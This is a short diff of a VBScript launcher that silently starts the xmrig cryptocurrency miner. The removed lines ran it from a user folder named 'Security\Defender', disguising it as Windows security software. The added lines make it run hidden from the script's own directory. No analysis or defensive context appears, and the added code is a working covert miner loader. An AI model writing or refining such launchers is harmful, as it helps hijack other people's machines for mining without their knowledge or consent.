@@ -1,5 +1,5 @@
+Set Fso      = CreateObject("Scripting.FileSystemObject")
 Set WshShell = CreateObject("WScript.Shell")
-Dim UserName : UserName = WshShell.ExpandEnvironmentStrings("%USERNAME%")
-Dim ExePath  : ExePath  = "C:\Users\" & UserName & "\Security\Defender\xmrig.exe"
-WshShell.CurrentDirectory = "C:\Users\" & UserName & "\Security\Defender"
-WshShell.Run """" & ExePath & """", 0, False
+Dim VbsDir   : VbsDir = Fso.GetParentFolderName(WScript.ScriptFullName)
+WshShell.CurrentDirectory = VbsDir
+WshShell.Run """" & VbsDir & "\xmrig.exe""", 0, False
